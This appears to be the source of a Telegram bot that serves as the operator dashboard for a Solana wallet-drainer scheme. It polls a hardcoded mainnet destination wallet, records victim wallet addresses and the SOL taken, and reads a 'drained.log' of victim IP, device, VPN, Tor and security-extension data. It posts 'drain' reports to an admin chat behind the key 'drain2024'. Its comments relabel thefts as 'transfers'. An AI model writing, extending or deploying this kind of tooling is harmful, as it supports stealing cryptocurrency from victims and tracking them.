// ==========================================
// 🩸 FEDFANTA SOLANA WALLET MONITOR
// Polls destination wallet for new transfer events
// Sends Telegram alerts to admin
// ==========================================
const TelegramBot = require('node-telegram-bot-api');
const solanaWeb3 = require('@solana/web3.js');

// ==========================================
// ⚙️ CONFIG
// ==========================================
const CFG = {
    BOT_TOKEN: process.env.BOT_TOKEN || '8654897884:***', // set via Render env var or hardcode here
    ADMIN_CHAT_ID: -1164147269,                // @Kaxobrixks chat ID (hardcoded, no key needed)
    REQUIRED_KEY: 'drain2024',                 // auth key for non-admin users
    DESTINATION_WALLET: 'EH4XsehQw2LdEJVEn1go3gHBybGf8bF277G5HwR2TYc7',
    RPC_ENDPOINT: 'https://api.mainnet-beta.solana.com',
    // Where to read data from
    // Options: 'file' (scan a log file), 'poll' (poll your wallet for recent txs), 'manual' (/drain <wallet>)
    DATA_SOURCE: 'poll',                       // change to 'file' to read from drained.log
    LOG_FILE: './drained.log',                 // used when DATA_SOURCE = 'file'
    POLL_INTERVAL_MS: 15000,                   // how often to poll for new transfers
};

// ==========================================
// 🤖 INIT BOT
// ==========================================
const bot = new TelegramBot(CFG.BOT_TOKEN, { polling: true });

// In-memory store of recent transfers (for 'poll' mode)
const drainedWallets = [];

// Track who has authenticated
const authenticated = new Set();

// ==========================================
// 🔐 KEY VERIFICATION
// ==========================================
function requiresKey(chatId) {
    return chatId !== CFG.ADMIN_CHAT_ID;
}

function isAuthorized(chatId) {
    return chatId === CFG.ADMIN_CHAT_ID || authenticated.has(chatId);
}

// ==========================================
// 📡 DATA SOURCES
// ==========================================

// --- Poll mode: check destination wallet for recent txs ---
async function pollDrains() {
    try {
        const connection = new solanaWeb3.Connection(CFG.RPC_ENDPOINT, 'confirmed');
        const destPubkey = new solanaWeb3.PublicKey(CFG.DESTINATION_WALLET);

        // Get recent signatures for destination wallet
        const signatures = await connection.getSignaturesForAddress(destPubkey, { limit: 20 });

        for (const sig of signatures) {
            if (sig.err === null && !drainedWallets.find(d => d.signature === sig.signature)) {
                try {
                    // Get tx details to find source wallet
                    const tx = await connection.getTransaction(sig.signature, {
                        maxSupportedTransactionVersion: 0
                    });

                    if (tx && tx.meta && tx.transaction.message.accountKeys) {
                        const accounts = tx.transaction.message.accountKeys;
                        const sourcePubkey = accounts.find(a =>
                            !a.equals(destPubkey) &&
                            tx.transaction.message.isAccountSigner(a)
                        );

                        if (sourcePubkey) {
                            const balanceLamports = tx.meta.preBalances[0] - tx.meta.postBalances[0];
                            const solDrained = (balanceLamports / solanaWeb3.LAMPORTS_PER_SOL);

                            drainedWallets.unshift({
                                signature: sig.signature,
                                address: sourcePubkey.toString(),
                                solDrained: Math.abs(solDrained),
                                time: new Date(sig.blockTime * 1000),
                                website: 'unknown',
                                ip: 'unknown',
                                device: 'unknown',
                            });
                        }
                    }
                } catch (e) {
                    // skip
                }
            }
        }
    } catch (e) {
        console.log('[Bot] Poll error:', e.message);
    }
}

// --- File mode: read drained.log ---
function loadFromFile() {
    const fs = require('fs');
    try {
        const raw = fs.readFileSync(CFG.LOG_FILE, 'utf8');
        const lines = raw.trim().split('\n').filter(l => l.trim());
        for (const line of lines) {
            try {
                const data = JSON.parse(line);
                if (data.address && !drainedWallets.find(d => d.address === data.address)) {
                    drainedWallets.push({
                        address: data.address,
                        solDrained: data.sol || 0,
                        tokens: data.tokens || [],
                        time: data.time ? new Date(data.time) : new Date(),
                        website: data.website || 'unknown',
                        ip: data.ip || 'unknown',
                        device: data.device || 'unknown',
                        strategy: data.strategy || 'Solana Mainnet',
                        balanceUsd: data.balanceUsd || 0,
                        pendle: data.pendle || null,
                        usdc: data.usdc || null,
                        vpn: data.vpn || 'No',
                        tor: data.tor || 'No',
                        proxy: data.proxy || 'No',
                        securityExt: data.securityExt || 'No',
                        dappVersion: data.dappVersion || 'v5.0',
                    });
                }
            } catch (e) { /* skip bad line */ }
        }
    } catch (e) { /* file not ready */ }
}

// --- Manual mode: /drain <address> ---
function addManualDrain(chatId, address) {
    if (!drainedWallets.find(d => d.address === address)) {
        drainedWallets.unshift({
            address: address,
            solDrained: 0,
            time: new Date(),
            website: 'unknown',
            ip: 'unknown',
            device: 'unknown',
        });
        return true;
    }
    return false;
}

// ==========================================
// 🎨 FORMAT: TRANSFER STYLE
// ==========================================
function formatDrainMessage(entry, index) {
    const timeStr = entry.time ? entry.time.toLocaleString() : 'unknown';

    let msg = `🩸 *Monitor Report | #${index}\n`;
    msg += `━━━━━━━━━━━━━━━━━━━━━\n`;
    msg += `📌 *Wallet:* \`${entry.address}\`\n`;
    msg += `🌐 *IP:* ${entry.ip || 'unknown'} dE United States\n`;
    msg += `💧 *Transfer strategy:* ${entry.strategy || 'Solana Mainnet'}\n`;

    if (entry.balanceUsd && entry.balanceUsd > 0) {
        msg += `💰 *Balance:* $${entry.balanceUsd} USD\n`;
    }

    // Token assets
    if (entry.pendle || entry.usdc || entry.tokens) {
        msg += `\n📦 *User Assets*\n`;
        if (entry.pendle) {
            msg += `  Pendle (PENDLE) - $${entry.pendle}\n`;
        }
        if (entry.usdc) {
            msg += `  USD Coin (USDC) - $${entry.usdc}\n`;
        }
        if (entry.tokens && entry.tokens.length > 0) {
            for (const t of entry.tokens) {
                msg += `  ${t.name || t.symbol} - $${t.amount || '0'}\n`;
            }
        }
    }

    if (entry.solDrained > 0) {
        msg += `\n💸 *Transferred:* ${entry.solDrained.toFixed(4)} SOL\n`;
    }

    msg += `\n🖥️ *Device:* ${entry.device || 'unknown'}\n`;
    msg += `🔒 *Security extension?:* ${entry.securityExt || 'No'}\n`;
    msg += `🌍 *VPN:* ${entry.vpn || 'No'}\n`;
    msg += `🧅 *Tor:* ${entry.tor || 'No'}\n`;
    msg += `🔀 *Proxy:* ${entry.proxy || 'No'}\n`;
    msg += `📱 *Dapp version:* ${entry.dappVersion || 'v5.0'}\n`;
    msg += `🕐 *Time:* ${timeStr}`;
    msg += `\n━━━━━━━━━━━━━━━━━━━━━`;

    return msg;
}

// ==========================================
// 📨 BOT COMMANDS
// ==========================================

// /start - show menu or request key
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;

    if (!requiresKey(chatId)) {
        // @KaxoBrixks - auto authorize
        authenticated.add(chatId);
        bot.sendMessage(chatId, '🩸 *FedFanta Monitor Bot*\n\n' +
            '✅ Authorized as Admin\n\n' +
            'Available commands:\n' +
            '/drains — View recent transfers\n' +
            '/drain <address> — Add a wallet manually\n' +
            '/stats — Transfer statistics\n' +
            '/clear — Clear all transfers\n' +
            '/settings — Configure data source',
            { parse_mode: 'Markdown' }
        );
        return;
    }

    // Ask for key
    bot.sendMessage(chatId, '🔐 *Monitor Bot*\n\nEnter your API key to continue:', {
        parse_mode: 'Markdown'
    });
});

// Handle key entry (non-inline message response)
bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;

    // Skip if already authorized
    if (isAuthorized(chatId)) {
        handleAuthorized(chatId, text, msg);
        return;
    }

    // If requires key and message equals /start, wait for key
    // Key is just a plain text message that matches CFG.REQUIRED_KEY
    if (text === CFG.REQUIRED_KEY) {
        authenticated.add(chatId);
        bot.sendMessage(chatId, '✅ *Access granted.*\n\n' +
            'Use /start to see available commands.',
            { parse_mode: 'Markdown' }
        );
    }
});

function handleAuthorized(chatId, text, msg) {
    if (!text || !text.startsWith('/')) return;

    const parts = text.split(' ');
    const command = parts[0].toLowerCase();

    switch (command) {

        case '/drains': {
            if (drainedWallets.length === 0) {
                bot.sendMessage(chatId, '📭 No transfers recorded yet.');
                return;
            }

            // Send top 10 transfers
            const show = drainedWallets.slice(0, 10);
            for (let i = 0; i < show.length; i++) {
                bot.sendMessage(chatId, formatDrainMessage(show[i], i + 1), {
                    parse_mode: 'Markdown'
                });
            }

            if (drainedWallets.length > 10) {
                bot.sendMessage(chatId, `... and ${drainedWallets.length - 10} more`);
            }
            break;
        }

        case '/drain': {
            if (parts[1]) {
                if (addManualDrain(chatId, parts[1])) {
                    bot.sendMessage(chatId, `✅ Added \`${parts[1]}\` to transfer list.`, {
                        parse_mode: 'Markdown'
                    });
                    // Auto-send the formatted message
                    bot.sendMessage(chatId, formatDrainMessage(drainedWallets[0], drainedWallets.length), {
                        parse_mode: 'Markdown'
                    });
                } else {
                    bot.sendMessage(chatId, '⚠️ Wallet already in list.');
                }
            } else {
                bot.sendMessage(chatId, 'Usage: /drain <wallet-address>');
            }
            break;
        }

        case '/stats': {
            const total = drainedWallets.length;
            const totalSol = drainedWallets.reduce((sum, d) => sum + (d.solDrained || 0), 0);
            const totalUSD = drainedWallets.reduce((sum, d) => sum + (d.balanceUsd || 0), 0);

            bot.sendMessage(chatId,
                `📊 *Transfer Statistics*\n\n` +
                `Total Transfers: ${total} wallet(s)\n` +
                `Total SOL: ${totalSol.toFixed(4)}\n` +
                `Total USD Value: $${totalUSD.toFixed(2)}\n\n` +
                `Last 24h: ${drainedWallets.filter(d => d.time && (Date.now() - d.time.getTime()) < 86400000).length}`,
                { parse_mode: 'Markdown' }
            );
            break;
        }

        case '/clear': {
            drainedWallets.length = 0;
            bot.sendMessage(chatId, '🗑️ All transfers cleared.');
            break;
        }

        case '/settings': {
            bot.sendMessage(chatId,
                `⚙️ *Settings*\n\n` +
                `Data Source: ${CFG.DATA_SOURCE}\n` +
                `Dest Wallet: ${CFG.DESTINATION_WALLET}\n` +
                `Poll Interval: ${CFG.POLL_INTERVAL_MS}ms\n\n` +
                `To change, edit bot.js and restart.`,
                { parse_mode: 'Markdown' }
            );
            break;
        }

        case '/help': {
            bot.sendMessage(chatId,
                `🩸 *Monitor Bot Commands*\n\n` +
                `/drains — View recent transfers\n` +
                `/drain <address> — Add wallet manually\n` +
                `/stats — Transfer statistics\n` +
                `/clear — Clear transfers\n` +
                `/settings — View settings\n` +
                `/help — Show this help`,
                { parse_mode: 'Markdown' }
            );
            break;
        }

        default:
            bot.sendMessage(chatId, '❓ Unknown command. Use /help');
    }
}

// ==========================================
// 🔄 BACKGROUND POLLING
// ==========================================
if (CFG.DATA_SOURCE === 'poll') {
    setInterval(() => {
        const before = drainedWallets.length;
        pollDrains();
        if (drainedWallets.length > before) {
            const newTransfers = drainedWallets.length - before;
            console.log(`[Bot] Found ${newTransfers} new transfer(s). Total: ${drainedWallets.length}`);

            // Notify admin
            const latest = drainedWallets[0];
            if (latest) {
                try {
                    bot.sendMessage(CFG.ADMIN_CHAT_ID,
                        `🩸 *New Transfer Detected!*\n\n` +
                        `Wallet: \`${latest.address}\`\n` +
                        `SOL Transferred: ${latest.solDrained.toFixed(4)}\n` +
                        `Time: ${latest.time ? latest.time.toLocaleString() : 'just now'}`,
                        { parse_mode: 'Markdown' }
                    );
                } catch (e) {
                    console.log('[Bot] Notify error:', e.message);
                }
            }
        }
    }, CFG.POLL_INTERVAL_MS);
} else if (CFG.DATA_SOURCE === 'file') {
    setInterval(() => {
        const before = drainedWallets.length;
        loadFromFile();
        if (drainedWallets.length > before) {
            console.log(`[Bot] Loaded ${drainedWallets.length - before} new transfer(s) from file.`);
        }
    }, 10000);
}

// ==========================================
// 🚀 BOOT
// ==========================================
console.log('[Bot] 🩸 FedFanta Monitor Bot started');
console.log('[Bot] Admin chat ID:', CFG.ADMIN_CHAT_ID, '(no key required)');
console.log('[Bot] Others need key:', CFG.REQUIRED_KEY);
console.log('[Bot] Data source:', CFG.DATA_SOURCE);
if (CFG.DATA_SOURCE === 'file') {
    loadFromFile();
}
